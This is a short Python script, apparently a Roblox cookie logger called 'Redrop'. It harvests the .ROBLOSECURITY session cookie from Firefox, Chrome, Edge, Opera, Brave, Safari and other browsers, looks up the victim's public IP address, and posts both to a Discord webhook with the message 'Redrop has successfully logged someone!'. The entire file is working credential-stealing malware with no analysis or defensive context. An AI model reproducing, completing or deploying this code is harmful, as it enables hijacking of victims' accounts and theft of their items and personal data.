import os
from discordwebhook import Discord
import requests
import browser_cookie3


webhook = ""

if __name__ == "__main__":
    ip = requests.get("https://api.ipify.org").text
    def Log():

        data = [] 

        try:
            cookies = browser_cookie3.firefox(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.chromium(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.edge(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass

        try:
            cookies = browser_cookie3.opera(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.brave(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.vivaldi(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.safari(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
        try:
            cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass
    roblox = Log()

    if roblox == None:
        roblox = "No Roblox Cookie Found"





    discord = Discord(url=webhook)
    discord.post(
        username="Redrop",
        avatar_url="https://media.discordapp.net/attachments/1094401461418467409/1094401713714245714/Redrop.png?width=670&height=670",
        embeds=[
            {
                "username": "Redrop",
                "title" : "Redrop has successfully logged someone!",
                "author": {
                "name": f"Redrop Has Logged Someone!",
                "icon_url": "https://media.discordapp.net/attachments/1094401461418467409/1094401713714245714/Redrop.png?width=670&height=670",
                },
                "description" : f"",
                "color" : 16815,
                "fields": [
                    {"name": "Roblox Cookie", "value": f"```{roblox}```", "inline": False},
                    {"name": "IP Address", "value": f"**`{ip}`**","inline": False},
                    

                ],
                "thumbnail": {"url": "https://media.discordapp.net/attachments/1094401461418467409/1094401713714245714/Redrop.png?width=670&height=670"}


            },
            
            
        ],
    )
